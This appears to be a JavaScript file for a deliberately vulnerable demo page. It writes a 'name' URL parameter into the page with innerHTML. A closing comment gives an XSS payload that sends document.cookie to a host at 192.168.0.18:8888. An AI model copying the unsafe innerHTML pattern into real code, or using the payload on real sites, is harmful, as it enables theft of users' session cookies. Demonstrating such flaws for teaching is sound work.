document.addEventListener("DOMContentLoaded", function () {
  // Function to set a cookie
  function setCookie(name, value, days) {
    const date = new Date();
    date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
    const expires = "expires=" + date.toUTCString();
    document.cookie = name + "=" + value + ";" + expires + ";path=/";
  }

  // Get the name from URL search parameters
  const urlParams = new URLSearchParams(window.location.search);
  const name = urlParams.get("name");

  // Check if the name is provided
  if (name) {
    // Set a cookie with the name and an expiration date of 7 days
    setCookie("userName", "Gaming", 7);

    // Inject the name into the span element
    document.getElementById("nameSpan").innerHTML = name;
  } else {
    // If name is not provided, check if it is stored in a cookie
    const storedName = document.cookie.replace(
      /(?:(?:^|.*;\s*)userName\s*=\s*([^;]*).*$)|^.*$/,
      "$1"
    );

    if (storedName) {
      // If a name is stored in the cookie, use it
      document.getElementById("nameSpan").textContent = storedName;
    } else {
      // If no name is provided and not stored in the cookie, display a default message
      document.getElementById("nameSpan").textContent = "Guest";
    }
  }
});

// The Injection Code
// <img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
